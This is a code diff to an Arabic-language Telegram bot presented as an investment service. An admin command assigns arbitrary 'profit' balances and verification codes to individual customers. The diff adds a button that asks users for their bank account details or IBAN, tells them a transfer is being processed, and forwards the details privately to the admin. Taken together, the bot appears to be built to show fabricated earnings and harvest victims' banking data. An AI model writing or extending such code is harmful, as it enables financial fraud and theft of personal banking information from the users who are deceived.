@@ -52,7 +52,6 @@ def estimate_account_age(user_id: int) -> str:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
 # أمر الأدمن لتحديد المبلغ ورقم التحقق لزبون معين بدقة:
-# /setprofit <user_id> <amount> <code_number>
 async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -121,7 +120,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=reply_markup)
 
-# معالجة الرسائل النصية والتحقق من البيانات ورقم التحقق
+# معالجة الرسائل النصية
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     if not msg or not msg.text:
@@ -147,6 +146,23 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
         return
 
+    # الحالة الخاصة بإدخال الحساب البنكي بعد الضغط على الزر
+    if current_state == "waiting_for_bank_account":
+        user_states[user_id] = "completed"
+        await msg.reply_text("✅ **تم حفظ بيانات الحساب البنكي بنجاح!**\n\nجاري معالجة عملية تحويل الأرباح لحسابك.")
+        
+        # إشعار للأدمن بالحساب البنكي المدخل
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=(
+                "🏦 **تم إدخال الحساب البنكي من قبل مستخدم!**\n\n"
+                f"• معرف المستخدم: `{user_id}` ({username})\n"
+                f"• تفاصيل الحساب البنكي:\n{text}"
+            ),
+            parse_mode="Markdown"
+        )
+        return
+
     # الحالة الثانية: التحقق من رقم التحقق المدخل من الزبون
     if current_state == "waiting_for_code" or text in custom_profits:
         if text in custom_profits:
@@ -162,7 +178,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # حرق الكود واستبعاده فوراً
             del custom_profits[text]
             USED_CODES.add(text)
-            user_states[user_id] = "choosing"
+            user_states[user_id] = "viewing_balance"
             
             # توليد رقم تحقق جديد للأدمن
             auto_new_code = generate_new_code()
@@ -179,8 +195,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
 
-            # الأزرار (تأكيد السحب وإلغاء سحب)
+            # الزر الجديد في رسالة عرض الرصيد: "ادخل حسابك البنكي"
             keyboard = [
+                [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")],
                 [
                     InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
                     InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
@@ -190,7 +207,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")
 
-            # عرض الأرباح للمستخدم مع الأزرار
+            # عرض الأرباح للمستخدم مع الأزرار الجديدة
             await msg.reply_text(
                 text=(
                     "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
@@ -216,7 +233,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = f"@{user.username}" if user.username else "بدون معرف"
 
     if data == "btn_withdraw":
-        # النص الجديد المحدث بناءً على طلبك
         withdraw_text = (
             "📤 **طلب سحب الأرباح:**\n\n"
             "• أرسل بياناتك ليتم إنظام (التاكد من اشتراكك) ليتم ظهور لك أزرار تحقق.\n\n"
@@ -236,6 +252,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
         ]
         await query.edit_message_text(main_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data == "enter_bank_account":
+        user_states[user_id] = "waiting_for_bank_account"
+        await query.edit_message_text(
+            "💳 **إدخال الحساب البنكي:**\n\n"
+            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
+            parse_mode="Markdown"
+        )
 
     elif data == "withdraw_cancel":
         user_states[user_id] = "completed"
@@ -273,7 +297,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالتعديلات الجديدة المطلوبة...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بزر الحساب البنكي والأزرار في الأسفل...")
     app.run_polling()
 
 if __name__ == "__main__":
